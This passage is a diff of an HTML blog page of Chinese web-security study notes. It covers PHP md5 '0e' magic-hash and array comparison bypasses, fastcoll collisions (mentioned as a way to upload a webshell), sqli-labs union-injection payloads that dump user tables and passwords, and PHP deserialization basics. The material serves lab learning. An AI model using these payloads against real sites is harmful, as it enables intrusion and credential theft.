class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"><span class="number">240610708</span> </span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br><span class="line"><span class="number">314282422</span> </span><br><span class="line"><span class="number">0e990995504821699494520356953734</span></span><br><span class="line"><span class="number">571579406</span> </span><br><span class="line"><span class="number">0e972379832854295224118025748221</span></span><br><span class="line"><span class="number">903251147</span> </span><br><span class="line"><span class="number">0e174510503823932942361353209384</span></span><br><span class="line"><span class="number">1110242161</span> </span><br><span class="line"><span class="number">0e435874558488625891324861198103</span></span><br><span class="line"><span class="number">1320830526</span> </span><br><span class="line"><span class="number">0e912095958985483346995414060832</span></span><br><span class="line"><span class="number">1586264293</span> </span><br><span class="line"><span class="number">0e622743671155995737639662718498</span></span><br><span class="line"><span class="number">2302756269</span> </span><br><span class="line"><span class="number">0e250566888497473798724426794462</span></span><br><span class="line"><span class="number">2427435592</span> </span><br><span class="line"><span class="number">0e067696952328669732475498472343</span></span><br><span class="line"><span class="number">2653531602</span> </span><br><span class="line"><span class="number">0e877487522341544758028810610885</span></span><br><span class="line"><span class="number">3293867441</span> </span><br><span class="line"><span class="number">0e471001201303602543921144570260</span></span><br><span class="line"><span class="number">3295421201</span> </span><br><span class="line"><span class="number">0e703870333002232681239618856220</span></span><br><span class="line"><span class="number">3465814713</span> </span><br><span class="line"><span class="number">0e258631645650999664521705537122</span></span><br><span class="line"><span class="number">3524854780</span> </span><br><span class="line"><span class="number">0e507419062489887827087815735195</span></span><br><span class="line"><span class="number">3908336290</span> </span><br><span class="line"><span class="number">0e807624498959190415881248245271</span></span><br><span class="line"><span class="number">4011627063</span> </span><br><span class="line"><span class="number">0e485805687034439905938362701775</span></span><br><span class="line"><span class="number">4775635065</span> </span><br><span class="line"><span class="number">0e998212089946640967599450361168</span></span><br><span class="line"><span class="number">4790555361</span> </span><br><span class="line"><span class="number">0e643442214660994430134492464512</span></span><br><span class="line"><span class="number">5432453531</span> </span><br><span class="line"><span class="number">0e512318699085881630861890526097</span></span><br><span class="line"><span class="number">5579679820</span> </span><br><span class="line"><span class="number">0e877622011730221803461740184915</span></span><br><span class="line"><span class="number">5585393579</span> </span><br><span class="line"><span class="number">0e664357355382305805992765337023</span></span><br><span class="line"><span class="number">6376552501</span> </span><br><span class="line"><span class="number">0e165886706997482187870215578015</span></span><br><span class="line"><span class="number">7124129977</span> </span><br><span class="line"><span class="number">0e500007361044747804682122060876</span></span><br><span class="line"><span class="number">7197546197</span> </span><br><span class="line"><span class="number">0e915188576072469101457315675502</span></span><br><span class="line"><span class="number">7656486157</span> </span><br><span class="line"><span class="number">0e451569119711843337267091732412</span></span><br><span class="line">QLTHNDT </span><br><span class="line"><span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO </span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">EEIZDOI </span><br><span class="line"><span class="number">0e782601363539291779881938479162</span></span><br><span class="line">TUFEPMC </span><br><span class="line"><span class="number">0e839407194569345277863905212547</span></span><br><span class="line">UTIPEZQ </span><br><span class="line"><span class="number">0e382098788231234954670291303879</span></span><br><span class="line">UYXFLOI </span><br><span class="line"><span class="number">0e552539585246568817348686838809</span></span><br><span class="line">IHKFRNS </span><br><span class="line"><span class="number">0e256160682445802696926137988570</span></span><br><span class="line">PJNPDWY </span><br><span class="line"><span class="number">0e291529052894702774557631701704</span></span><br><span class="line">ABJIHVY </span><br><span class="line"><span class="number">0e755264355178451322893275696586</span></span><br><span class="line">DQWRASX </span><br><span class="line"><span class="number">0e742373665639232907775599582643</span></span><br><span class="line">DYAXWCA </span><br><span class="line"><span class="number">0e424759758842488633464374063001</span></span><br><span class="line">GEGHBXL </span><br><span class="line"><span class="number">0e248776895502908863709684713578</span></span><br><span class="line">GGHMVOE </span><br><span class="line"><span class="number">0e362766013028313274586933780773</span></span><br><span class="line">GZECLQZ </span><br><span class="line"><span class="number">0e537612333747236407713628225676</span></span><br><span class="line">NWWKITQ </span><br><span class="line"><span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF </span><br><span class="line"><span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MAUXXQC </span><br><span class="line"><span class="number">0e478478466848439040434801845361</span></span><br><span class="line">MMHUWUV </span><br><span class="line"><span class="number">0e701732711630150438129209816536</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="数组绕过（PHP-8-无法绕过）"><a href="#数组绕过（PHP-8-无法绕过）" class="headerlink" title="数组绕过（PHP 8 无法绕过）"></a>数组绕过（PHP 8 无法绕过）</h4><p>在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 <code>==</code> 和 <code>===</code> 比较的结果均为 True</p>
+<h5 id="数组绕过（PHP-8-无法绕过）"><a href="#数组绕过（PHP-8-无法绕过）" class="headerlink" title="数组绕过（PHP 8 无法绕过）"></a>数组绕过（PHP 8 无法绕过）</h5><p>在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 <code>==</code> 和 <code>===</code> 比较的结果均为 True</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /param.php?a[]=1&amp;b[]=2</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(PHP_VERSION . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="md5-碰撞"><a href="#md5-碰撞" class="headerlink" title="md5 碰撞"></a>md5 碰撞</h4><p>利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件。<br>新建一个空的 txt 文档。</p>
+<h5 id="md5-碰撞"><a href="#md5-碰撞" class="headerlink" title="md5 碰撞"></a>md5 碰撞</h5><p>利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件。<br>新建一个空的 txt 文档。</p>
 <p>然后拖到 exe 上，自动生成两个文件。</p>
 <p>得到两个文件，通过代码读取即可。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;D:tmp\a_msg1.txt&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;D:tmp\a_msg2.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span> === <span class="variable">$b</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) . <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木马</p>
-<h3 id="sqli-labs靶场学习"><a href="#sqli-labs靶场学习" class="headerlink" title="sqli-labs靶场学习"></a>sqli-labs靶场学习</h3><h4 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#联合注入字符型</span><br><span class="line">?id=1&#x27;				#错误显示</span><br><span class="line">?id=1&#x27;--+			#正常显示，为字符型注入</span><br><span class="line">?id=1&#x27; order by 3 --+	#判断列数</span><br><span class="line">?id=-1 union select 1,2,3		#爆出显示位</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<h4 id="二-sqli-labs靶场学习"><a href="#二-sqli-labs靶场学习" class="headerlink" title="二.sqli-labs靶场学习"></a>二.sqli-labs靶场学习</h4><h5 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#联合注入字符型</span><br><span class="line">?id=1&#x27;				#错误显示</span><br><span class="line">?id=1&#x27;--+			#正常显示，为字符型注入</span><br><span class="line">?id=1&#x27; order by 3 --+	#判断列数</span><br><span class="line">?id=-1 union select 1,2,3		#爆出显示位</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
 
-<h4 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#联合注入数字型</span><br><span class="line">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span><br><span class="line">&quot;SELECT * FROM users WHERE id=1 &#x27; LIMIT 0,1&quot;出错信息。</span><br><span class="line"> </span><br><span class="line"> #数字型</span><br><span class="line">?id=1 order by 3</span><br><span class="line">?id=-1 union select 1,2,3</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<h5 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#联合注入数字型</span><br><span class="line">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span><br><span class="line">&quot;SELECT * FROM users WHERE id=1 &#x27; LIMIT 0,1&quot;出错信息。</span><br><span class="line"> </span><br><span class="line"> #数字型</span><br><span class="line">?id=1 order by 3</span><br><span class="line">?id=-1 union select 1,2,3</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h4><p>![](C:\Users\tong\Pictures\Screenshots\屏幕截图 2023-10-17 170104.png)</p>
+<h5 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h5><p>![](C:\Users\tong\Pictures\Screenshots\屏幕截图 2023-10-17 170104.png)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#联合注入字符型</span><br><span class="line">?id=2&#x27;)--+</span><br><span class="line">?id=1&#x27;) order by 3--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
+<h5 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
 
 
 
@@ -609,205 +351,610 @@
 
 
 
-<h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><h4 id="1-魔法方法"><a href="#1-魔法方法" class="headerlink" title="1.魔法方法"></a>1.魔法方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()            <span class="comment">//类的构造函数，创建对象时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()             <span class="comment">//类的析构函数，对象被销毁时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()                 <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>()           <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()                  <span class="comment">//读取不可访问属性的值时，这里的不可访问包含私有属性或未定义</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()                  <span class="comment">//在给不可访问属性赋值时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()                <span class="comment">//当对不可访问属性调用 isset() 或 empty() 时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()                <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()               <span class="comment">//当尝试以调用函数的方式调用一个对象时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()                <span class="comment">//执行serialize()时，先会调用这个方法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()               <span class="comment">//执行unserialize()时，先会调用这个方法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()             <span class="comment">//当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="三-php反序列化"><a href="#三-php反序列化" class="headerlink" title="三..php反序列化"></a>三..php反序列化</h4><h5 id="1-魔法方法"><a href="#1-魔法方法" class="headerlink" title="1.魔法方法"></a>1.魔法方法</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()            <span class="comment">//类的构造函数，创建对象时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()             <span class="comment">//类的析构函数，对象被销毁时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()                 <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>()           <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()                  <span class="comment">//读取不可访问属性的值时，这里的不可访问包含私有属性或未定义</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()                  <span class="comment">//在给不可访问属性赋值时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()                <span class="comment">//当对不可访问属性调用 isset() 或 empty() 时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()                <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()               <span class="comment">//当尝试以调用函数的方式调用一个对象时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()                <span class="comment">//执行serialize()时，先会调用这个方法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()               <span class="comment">//执行unserialize()时，先会调用这个方法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()             <span class="comment">//当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="2-序列化"><a href="#2-序列化" class="headerlink" title="2.序列化"></a>2.序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//类的数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">//输出数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;User &#x27;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is &#x27;</span>.<span class="variable language_">$this</span>-&gt;age.<span class="string">&#x27; years old.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="comment">// “.”表示字符串连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line"><span class="variable">$usr</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="comment">//设置数据</span></span><br><span class="line"><span class="variable">$usr</span>-&gt;age = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$usr</span>-&gt;name = <span class="string">&#x27;Hardworking666&#x27;</span>;</span><br><span class="line"><span class="comment">//输出数据</span></span><br><span class="line"><span class="variable">$usr</span>-&gt;<span class="title function_ invoke__">printdata</span>();</span><br><span class="line"><span class="comment">//输出序列化后的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$usr</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="2-序列化"><a href="#2-序列化" class="headerlink" title="2.序列化"></a>2.序列化</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//类的数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">//输出数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span 